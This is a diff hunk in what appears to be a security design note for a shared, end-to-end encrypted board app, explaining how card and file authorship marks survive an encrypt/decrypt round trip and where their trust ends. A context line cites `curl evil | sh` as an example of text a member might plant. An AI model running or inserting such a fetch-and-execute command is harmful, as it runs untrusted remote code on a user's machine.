@@ -1779,7 +1779,14 @@ tags that direct them are the owner's alone, and so are the cards that carry the
     `curl evil | sh` read as the owner's. Now `adopt` carries each card's `member` and each
     file's `by` across from the live board, never from the copy the browser sent. Files are
     uploaded again in both directions and get new ids, so a file takes the uploader of the
-    file in the same place on the same card. On the encrypted board the marks stay as they
+    file in the same place on the same card, and a board that comes back with a different
+    number of files on any card is refused (`sameShape`). Said plainly: through an encrypt and
+    decrypt round trip the marks follow the card id and the file position as the owner's own
+    browser sent them. The server can't read ciphertext, so it can't tell that the text under
+    a card id is still that card's text or that the files came back in order. A forged
+    payload from the owner's own session (files reversed, two cards' sealed text swapped)
+    moves the marks; a member can't send one. That makes the marks as trustworthy as the
+    owner's session, the same as "These words are mine now". On the encrypted board the marks stay as they
     are, an email and a time, not encrypted (`// END_TO_END_ENCRYPTION`, "What it doesn't
     hide"). `check:members` shares a board, encrypts it, decrypts it, and reads the card
     back over MCP.
